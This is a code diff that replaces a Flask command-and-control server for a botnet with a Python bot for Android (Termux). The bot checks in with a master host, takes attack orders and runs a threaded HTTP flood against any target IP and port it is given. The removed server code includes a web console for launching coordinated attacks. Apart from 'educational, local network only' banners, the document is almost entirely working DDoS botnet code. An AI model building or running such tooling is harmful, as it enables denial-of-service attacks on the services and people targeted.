@@ -1,267 +1,218 @@
-#!/usr/bin/env python3
+#!/data/data/com.termux/files/usr/bin/python3
 """
-Servidor de Comando y Control Simplificado
-Para proyecto universitario de botnet educativa
+🤖 BOT MOVIL DDoS - Conecta al servidor maestro
+Ejecutar en Termux: python3 bot_movil.py
 """
 
-from flask import Flask, request, jsonify
+import socket
+import threading
 import time
-from threading import Lock
-import json
+import random
+import os
+import sys
 
-app = Flask(__name__)
+# ========= CONFIGURACIÓN =========
+# CAMBIA ESTO A LA IP DE TU PC
+MASTER_IP = "192.168.1.10"  # ← TU IP PRIVADA AQUÍ
+MASTER_PORT = 9999
+BOT_ID = f"MOVIL_{random.randint(1000, 9999)}"
 
-# Base de datos simple de bots
-bots_db = {}
-attacks_log = []
-db_lock = Lock()
+# ========= FUNCIONES =========
+def log(msg):
+    timestamp = time.strftime("%H:%M:%S")
+    print(f"[{timestamp}] [{BOT_ID}] {msg}")
 
-# Configuración
-LISTEN_IP = "0.0.0.0"  # Escuchar en todas las interfaces
-LISTEN_PORT = 5000
-
-@app.route('/')
-def index():
-    return """
-    <html>
-        <head><title>C&C - BotNet Educativa</title></head>
-        <body>
-            <h1>🤖 Servidor de Comando y Control</h1>
-            <p>Bots registrados: {}</p>
-            <p><a href="/bots">Ver bots</a></p>
-            <p><a href="/attack_console">Consola de ataque</a></p>
-        </body>
-    </html>
-    """.format(len(bots_db))
-
-@app.route('/register', methods=['POST'])
-def register_bot():
+def get_device_info():
+    """Obtiene info del dispositivo Android"""
     try:
-        data = request.json
-        bot_id = data.get('bot_id', 'unknown')
+        # Obtener IP local
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        s.connect(("8.8.8.8", 53))
+        local_ip = s.getsockname()[0]
+        s.close()
         
-        with db_lock:
-            bots_db[bot_id] = {
-                'ip': request.remote_addr,
-                'last_seen': time.time(),
-                'data': data,
-                'status': 'active'
-            }
-        
-        print(f"[+] Bot registrado: {bot_id} desde {request.remote_addr}")
-        return jsonify({'status': 'success', 'message': 'Registered'})
-        
-    except Exception as e:
-        print(f"[-] Error en registro: {e}")
-        return jsonify({'status': 'error', 'message': str(e)}), 400
-
-@app.route('/heartbeat', methods=['POST'])
-def heartbeat():
-    try:
-        data = request.json
-        bot_id = data.get('bot_id', 'unknown')
-        
-        with db_lock:
-            if bot_id in bots_db:
-                bots_db[bot_id]['last_seen'] = time.time()
-                bots_db[bot_id]['status'] = 'active'
-                print(f"[.] Heartbeat de {bot_id}")
-        
-        return jsonify({'status': 'ack'})
-        
-    except Exception as e:
-        return jsonify({'status': 'error'}), 400
-
-@app.route('/command/<bot_id>', methods=['GET'])
-def get_command(bot_id):
-    """Devuelve comandos para un bot específico"""
-    # Por ahora, todos reciben el mismo comando
-    # En una versión avanzada, podrías tener colas por bot
-    
-    with db_lock:
-        if bot_id not in bots_db:
-            return jsonify({'action': 'register'}), 404
-    
-    # Comando de ejemplo (puedes cambiar esto)
-    command = {
-        'action': 'attack',
-        'target': '192.168.1.100',  # Cambia esto
-        'port': 8080,
-        'duration': 30,
-        'intensity': 10,
-        'timestamp': time.time()
-    }
-    
-    return jsonify(command)
-
-@app.route('/send_command', methods=['POST'])
-def send_command_all():
-    """Envía comando a TODOS los bots"""
-    try:
-        command = request.json
-        
-        with db_lock:
-            # Guardar el comando para que los bots lo recojan
-            for bot_id in bots_db.keys():
-                bots_db[bot_id]['last_command'] = command
-        
-        # Registrar ataque
-        attacks_log.append({
-            'command': command,
-            'timestamp': time.time(),
-            'bot_count': len(bots_db)
-        })
-        
-        print(f"[!] Comando enviado a {len(bots_db)} bots: {command}")
-        return jsonify({'status': 'sent', 'bots': len(bots_db)})
-        
-    except Exception as e:
-        return jsonify({'status': 'error', 'message': str(e)}), 400
-
-@app.route('/bots', methods=['GET'])
-def list_bots():
-    """Lista todos los bots registrados"""
-    with db_lock:
-        # Limpiar bots inactivos (más de 5 minutos sin heartbeat)
-        current_time = time.time()
-        inactive_bots = []
-        
-        for bot_id, bot_data in list(bots_db.items()):
-            if current_time - bot_data['last_seen'] > 300:  # 5 minutos
-                inactive_bots.append(bot_id)
-        
-        for bot_id in inactive_bots:
-            del bots_db[bot_id]
-    
-    return jsonify({
-        'active_bots': len(bots_db),
-        'bots': bots_db,
-        'timestamp': time.time()
-    })
-
-@app.route('/attack_console')
-def attack_console():
-    """Interfaz web simple para enviar comandos"""
-    return """
-    <html>
-        <head>
-            <title>Consola de Ataque</title>
-            <style>
-                body { font-family: Arial; padding: 20px; }
-                .container { max-width: 800px; margin: 0 auto; }
-                input, button { padding: 10px; margin: 5px; }
-                .log { background: #222; color: #0f0; padding: 10px; }
-            </style>
-        </head>
-        <body>
-            <div class="container">
-                <h1>🎯 Consola de Ataque</h1>
-                
-                <h3>Configurar Ataque:</h3>
-                <div>
-                    <input type="text" id="target" placeholder="IP Objetivo" value="192.168.1.100">
-                    <input type="number" id="port" placeholder="Puerto" value="8080" min="1" max="65535">
-                    <br>
-                    <input type="number" id="duration" placeholder="Duración (segundos)" value="30" min="1" max="300">
-                    <input type="number" id="intensity" placeholder="Intensidad (1-20)" value="10" min="1" max="20">
-                    <br><br>
-                    <button onclick="sendAttack()">🚀 Ejecutar Ataque Coordinado</button>
-                </div>
-                
-                <h3>Bots Conectados: <span id="botCount">0</span></h3>
-                <div id="botList"></div>
-                
-                <h3>Log:</h3>
-                <div class="log" id="log">
-                    Servidor iniciado...
-                </div>
-            </div>
+        # Info de Android (si está disponible)
+        android_version = "Desconocido"
+        try:
+            android_version = os.popen("getprop ro.build.version.release").read().strip() or "Desconocido"
+        except:
+            pass
             
-            <script>
-                function updateBots() {
-                    fetch('/bots')
-                        .then(r => r.json())
-                        .then(data => {
-                            document.getElementById('botCount').textContent = data.active_bots;
-                            
-                            let botList = document.getElementById('botList');
-                            botList.innerHTML = '';
-                            
-                            for (let botId in data.bots) {
-                                let bot = data.bots[botId];
-                                let lastSeen = Math.floor((Date.now()/1000 - bot.last_seen));
-                                botList.innerHTML += `
-                                    <div style="border:1px solid #ccc; padding:10px; margin:5px;">
-                                        <strong>${botId}</strong><br>
-                                        IP: ${bot.ip}<br>
-                                        Última vez: ${lastSeen} segundos
-                                    </div>
-                                `;
-                            }
-                        });
-                }
-                
-                function sendAttack() {
-                    const command = {
-                        action: 'attack',
-                        target: document.getElementById('target').value,
-                        port: parseInt(document.getElementById('port').value),
-                        duration: parseInt(document.getElementById('duration').value),
-                        intensity: parseInt(document.getElementById('intensity').value)
-                    };
-                    
-                    fetch('/send_command', {
-                        method: 'POST',
-                        headers: {'Content-Type': 'application/json'},
-                        body: JSON.stringify(command)
-                    })
-                    .then(r => r.json())
-                    .then(data => {
-                        log(`Ataque enviado a ${data.bots} bots`);
-                    })
-                    .catch(e => log(`Error: ${e}`));
-                }
-                
-                function log(message) {
-                    let logDiv = document.getElementById('log');
-                    let time = new Date().toLocaleTimeString();
-                    logDiv.innerHTML = `[${time}] ${message}<br>` + logDiv.innerHTML;
-                }
-                
-                // Actualizar bots cada 10 segundos
-                setInterval(updateBots, 10000);
-                updateBots();
-            </script>
-        </body>
-    </html>
-    """
+        return f"IP:{local_ip}|Android:{android_version}"
+    except:
+        return "IP:Desconocida|Android:Desconocido"
 
-@app.route('/attack_report', methods=['POST'])
-def attack_report():
-    """Recibe reportes de ataques completados"""
-    try:
-        data = request.json
-        print(f"[📊] Reporte de ataque de {data.get('bot_id')}:")
-        print(f"    Objetivo: {data.get('target')}")
-        print(f"    Requests: {data.get('requests_sent')}")
-        print(f"    Duración: {data.get('duration')}s")
+def connect_to_master():
+    """Conecta y mantiene conexión con el maestro"""
+    log(f"Iniciando conexión a {MASTER_IP}:{MASTER_PORT}")
+    
+    while True:
+        try:
+            # Crear socket
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(30)
+            
+            # Conectar
+            sock.connect((MASTER_IP, MASTER_PORT))
+            
+            # Enviar identificación
+            device_info = get_device_info()
+            sock.send(f"HELLO|{BOT_ID}|{device_info}\n".encode())
+            
+            log("✅ Conectado al servidor maestro")
+            
+            # Escuchar comandos
+            while True:
+                try:
+                    data = sock.recv(1024).decode().strip()
+                    if not data:
+                        log("Conexión cerrada por el servidor")
+                        break
+                    
+                    log(f"Comando recibido: {data}")
+                    
+                    # Procesar comando
+                    if data == "PONG":
+                        pass
+                    elif data.startswith("ATTACK|"):
+                        # Formato: ATTACK|IP|PUERTO|DURACION|INTENSIDAD
+                        parts = data.split("|")
+                        if len(parts) >= 5:
+                            target_ip = parts[1]
+                            target_port = int(parts[2])
+                            duration = int(parts[3])
+                            intensity = int(parts[4])
+                            
+                            log(f"🔥 Ejecutando ataque: {target_ip}:{target_port}")
+                            
+                            # Iniciar ataque en hilo separado
+                            attack_thread = threading.Thread(
+                                target=execute_attack,
+                                args=(target_ip, target_port, duration, intensity, sock),
+                                daemon=True
+                            )
+                            attack_thread.start()
+                    
+                    # Enviar ping periódico
+                    sock.send("PING\n".encode())
+                    
+                except socket.timeout:
+                    # Timeout normal, enviar ping
+                    sock.send("PING\n".encode())
+                    continue
+                except Exception as e:
+                    log(f"Error en comunicación: {e}")
+                    break
+            
+            sock.close()
+            log("Desconectado. Reintentando en 5 segundos...")
+            
+        except ConnectionRefusedError:
+            log("❌ No se puede conectar al maestro. ¿Está ejecutándose?")
+        except Exception as e:
+            log(f"Error de conexión: {e}")
         
-        return jsonify({'status': 'received'})
+        # Esperar antes de reconectar
+        time.sleep(5)
+
+def execute_attack(target_ip, target_port, duration, intensity, master_sock):
+    """Ejecuta ataque HTTP flood"""
+    log(f"🎯 ATAQUE INICIADO: {target_ip}:{target_port} por {duration}s")
+    
+    end_time = time.time() + duration
+    request_count = 0
+    
+    # Headers HTTP variados
+    user_agents = [
+        "Mozilla/5.0 (Android 13; Mobile) AppleWebKit/537.36",
+        "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36",
+        "Termux-DDoS-Bot/1.0 (Proyecto Universitario)"
+    ]
+    
+    try:
+        while time.time() < end_time and request_count < (duration * intensity * 2):
+            try:
+                # Crear socket
+                attack_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                attack_sock.settimeout(2)
+                
+                # Conectar al objetivo
+                attack_sock.connect((target_ip, target_port))
+                
+                # Enviar múltiples requests por conexión
+                for _ in range(max(1, intensity // 2)):
+                    if time.time() > end_time:
+                        break
+                    
+                    # Construir request HTTP
+                    user_agent = random.choice(user_agents)
+                    http_request = (
+                        f"GET / HTTP/1.1\r\n"
+                        f"Host: {target_ip}\r\n"
+                        f"User-Agent: {user_agent}\r\n"
+                        f"Accept: text/html,application/xhtml+xml\r\n"
+                        f"Connection: keep-alive\r\n\r\n"
+                    )
+                    
+                    attack_sock.send(http_request.encode())
+                    request_count += 1
+                    
+                    # Pequeña pausa entre requests
+                    time.sleep(max(0.01, 1.0 / intensity))
+                
+                attack_sock.close()
+                
+                # Reportar cada 10 requests
+                if request_count % 10 == 0:
+                    master_sock.send(f"REPORT|Requests: {request_count}\n".encode())
+                    
+            except socket.error as e:
+                # Error de conexión - probablemente servidor saturado
+                log(f"⚠️  Error de socket: {e}")
+                time.sleep(0.5)
+            except Exception as e:
+                log(f"❌ Error en ataque: {e}")
+                break
+        
+        # Reporte final
+        log(f"✅ ATAQUE COMPLETADO: {request_count} requests enviados")
+        master_sock.send(f"REPORT|Ataque finalizado: {request_count} requests\n".encode())
         
     except Exception as e:
-        print(f"[-] Error en reporte: {e}")
-        return jsonify({'status': 'error'}), 400
+        log(f"❌ Error crítico en ataque: {e}")
 
-if __name__ == '__main__':
-    print(f"""
-    ╔══════════════════════════════════════════╗
-    ║     🎮 SERVIDOR C&C - BOTNET EDUCATIVA   ║
-    ║                                          ║
-    ║  Escuchando en: {LISTEN_IP}:{LISTEN_PORT:<15} ║
-    ║  Web Interface: http://localhost:{LISTEN_PORT} ║
-    ║                                          ║
-    ║  ⚠️  SOLO USO EDUCATIVO EN RED LOCAL    ║
-    ╚══════════════════════════════════════════╝
-    """)
+def show_banner():
+    """Muestra banner informativo"""
+    print("\n" + "="*50)
+    print("    🤖 BOT MOVIL DDoS - PROYECTO UNIVERSITARIO")
+    print("="*50)
+    print(f"ID: {BOT_ID}")
+    print(f"Maestro: {MASTER_IP}:{MASTER_PORT}")
+    print(f"Info: {get_device_info()}")
+    print("="*50)
+    print("⚠️  SOLO USO EDUCATIVO EN RED LOCAL AUTORIZADA")
+    print("="*50 + "\n")
+
+def main():
+    """Función principal"""
+    show_banner()
     
-    app.run(host=LISTEN_IP, port=LISTEN_PORT, debug=True)
+    # Iniciar conexión
+    try:
+        connect_to_master()
+    except KeyboardInterrupt:
+        log("Bot detenido por usuario")
+    except Exception as e:
+        log(f"Error fatal: {e}")
+    
+    print("\n👋 Bot finalizado")
+
+if __name__ == "__main__":
+    # Instalar requests si es necesario
+    try:
+        import requests
+    except:
+        print("Instalando requests...")
+        os.system("pip install requests > /dev/null 2>&1")
+    
+    main()
